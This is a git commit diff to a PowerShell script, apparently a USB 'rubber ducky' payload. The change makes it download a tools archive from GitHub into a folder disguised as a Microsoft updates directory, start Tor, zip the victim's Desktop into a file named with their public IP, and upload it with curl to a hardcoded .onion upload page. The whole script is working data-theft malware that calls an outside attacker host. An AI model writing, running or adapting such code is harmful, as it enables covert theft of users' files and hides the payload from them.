28637d24cfe4a8bdf420a31f0d88d36ddc56d1c4
Thomas Griffin <hello@thomasgriffin.co.uk>
2025-04-23 09:31:19 +0100

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,22 +1,31 @@
-# Define the volume label you're looking for
-$targetLabel = "CIRCUITPY"  # Replace this with your actual volume label
-
-# Get all logical drives and filter by volume label
-$drive = Get-Volume | Where-Object { $_.FileSystemLabel -eq $targetLabel }
-
-# Set drive letter for drive path
-$drivePath = "$($drive.DriveLetter):\"
-
 # Set paths
 $targetDirectory = [Environment]::GetFolderPath("UserProfile") + "\Desktop"
-$torPath = "$drive\tor\tor.exe"
-$torrcPath = "$drive\tor\torrc"
-$curlPath = "$drive\curl\curl.exe"
-$onionURL = "rokyn4z5yzjmbwb5pr5mdes2rmogz2vzfmrvt4mx6ur5mum5bqytkcad.onion/upload.php"
-$logFile = "$drive\tor.log"
+$dropPath = "$env:APPDATA\.microsoft\updates"
+$torPath = "$dropPath\tor\tor.exe"
+$torrcPath = "$dropPath\tor\torrc"
+$curlPath = "$dropPath\curl\bin\curl.exe"
+$onionURL = "rokyn4z5yzjmbwb5pr5mdes2rmogz2vzfmrvt4mx6ur5mum5bqytkcad.onion"
+$uploadPath = $onionURL + "/upload.php"
+$logFile = "$dropPath\tor.log"
+
+# Set the download URL
+$toolsURL = "https://raw.githubusercontent.com/barksploit/ducky/refs/heads/master/tools.zip"
+
+# Choose a hidden temporary path to store and extract
+New-Item -ItemType Directory -Force -Path $dropPath | Out-Null
+
+# Local path for the downloaded zip
+$zipFile = "$dropPath\tools.zip"
+
+# Download the zip file
+Invoke-WebRequest -Uri $toolsURL -OutFile $zipFile
+
+# Extract it
+Expand-Archive -Path $zipFile -DestinationPath $dropPath -Force
+
 Set-Content -Path $torrcPath -Value @"
 SocksPort 9050
-ClientOnionAuthDir $drive\tor\auth
+ClientOnionAuthDir $dropPath\tor\auth
 Log notice file $logFile
 "@
 
@@ -43,9 +52,9 @@ while (-not $bootstrapped -and $elapsed -lt $maxWait) {
 # Zip user folder
 $timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
 $publicIP = (Invoke-RestMethod -Uri "http://checkip.amazonaws.com").Trim()
-$filename = "$drive\dump_${publicIP}_$timestamp.zip"
+$filename = "$dropPath\dump_${publicIP}_$timestamp.zip"
 Add-Type -A 'System.IO.Compression.FileSystem'
-[IO.Compression.ZipFile]::CreateFromDirectory($userPath, $filename)
+[IO.Compression.ZipFile]::CreateFromDirectory($targetDirectory, $filename)
 
 Start-Process -FilePath $curlPath -ArgumentList "--proxy", "socks5h://127.0.0.1:9050", "-F", "file=@$filename", $onionURL -NoNewWindow -Wait
 
